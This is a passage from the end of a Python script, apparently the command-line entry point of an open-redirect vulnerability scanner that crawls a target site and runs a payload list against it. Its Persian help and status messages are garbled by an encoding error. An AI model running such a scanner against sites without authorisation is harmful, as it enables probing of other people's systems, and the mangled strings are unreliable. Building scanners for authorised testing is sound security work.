    parser = argparse.ArgumentParser(description='ÿßÿ≥⁄©ŸÜÿ± ÿ≠ÿ±ŸÅŸá‚Äåÿß€å ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å Open Redirect')
    parser.add_argument('target', nargs='?', help='URL ŸáÿØŸÅ ÿ®ÿ±ÿß€å ÿßÿ≥⁄©ŸÜ')
    parser.add_argument('--depth', type=int, default=3, help='ÿ≠ÿØÿß⁄©ÿ´ÿ± ÿπŸÖŸÇ ÿÆÿ≤ÿ¥ (Ÿæ€åÿ¥‚ÄåŸÅÿ±ÿ∂: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='ÿ≠ÿØÿß⁄©ÿ´ÿ± ÿµŸÅÿ≠ÿßÿ™ ÿÆÿ≤ÿ¥ (Ÿæ€åÿ¥‚ÄåŸÅÿ±ÿ∂: 100)')
    parser.add_argument('--output', default='open_redirect_report.html', help='ŸÜÿßŸÖ ŸÅÿß€åŸÑ ⁄Øÿ≤ÿßÿ±ÿ¥')
    parser.add_argument('--verbose', '-v', action='store_true', help='ŸÜŸÖÿß€åÿ¥ ÿ¨ÿ≤ÿ¶€åÿßÿ™')
    parser.add_argument('--check-deps', action='store_true', help='ÿ®ÿ±ÿ±ÿ≥€å Ÿàÿßÿ®ÿ≥ÿ™⁄Ø€å‚ÄåŸáÿß')
    parser.add_argument('--demo', action='store_true', help='ŸÜŸÖÿß€åÿ¥ ŸÜŸÖŸàŸÜŸá')
    
    args = parser.parse_args()
    
    # Check dependencies
    if args.check_deps:
        check_dependencies()
        return
    
    # Show demo
    if args.demo:
        show_usage()
        print("\nüéØ ŸÜŸÖŸàŸÜŸá Ÿæ€åŸÑŸàÿØŸáÿß:")
        scanner = OpenRedirectPro("https://example.com")
        for i, payload in enumerate(scanner.payloads[:10], 1):
            print(f"   {i}. {payload}")
        print(f"   ... Ÿà {len(scanner.payloads) - 10} Ÿæ€åŸÑŸàÿØ ÿØ€å⁄Øÿ±")
        return
    
    # Validate target
    if not args.target:
        print("‚ùå ŸÑÿ∑ŸÅÿßŸã URL ŸáÿØŸÅ ÿ±ÿß Ÿàÿßÿ±ÿØ ⁄©ŸÜ€åÿØ")
        show_usage()
        return
    
    # Normalize URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    # Setup logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check basic dependencies
    has_aiohttp = check_dependencies()
    if not has_aiohttp:
        print("\n‚ùå Ÿàÿßÿ®ÿ≥ÿ™⁄Ø€å‚ÄåŸáÿß€å ÿßÿµŸÑ€å ŸÖŸàÿ¨ŸàÿØ ŸÜ€åÿ≥ÿ™. ŸÑÿ∑ŸÅÿßŸã ŸÜÿµÿ® ⁄©ŸÜ€åÿØ:")
        print("pip3 install aiohttp")
        return
    
    print(f"\nüéØ ÿ¥ÿ±Ÿàÿπ ÿßÿ≥⁄©ŸÜ: {args.target}")
    print(f"üìä ÿ™ŸÜÿ∏€åŸÖÿßÿ™: ÿπŸÖŸÇ {args.depth}, ÿ≠ÿØÿß⁄©ÿ´ÿ± {args.max_pages} ÿµŸÅÿ≠Ÿá")
    
    # Create and run scanner
    scanner = OpenRedirectPro(args.target, args.depth, args.max_pages)
    await scanner.run_complete_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nüõë ÿßÿ≥⁄©ŸÜ ÿ™Ÿàÿ≥ÿ∑ ⁄©ÿßÿ±ÿ®ÿ± ŸÖÿ™ŸàŸÇŸÅ ÿ¥ÿØ")
    except Exception as e:
        print(f"‚ùå ÿÆÿ∑ÿß ÿØÿ± ÿßÿ≥⁄©ŸÜ: {e}")
        logging.error(f"Fatal error: {e}", exc_info=True)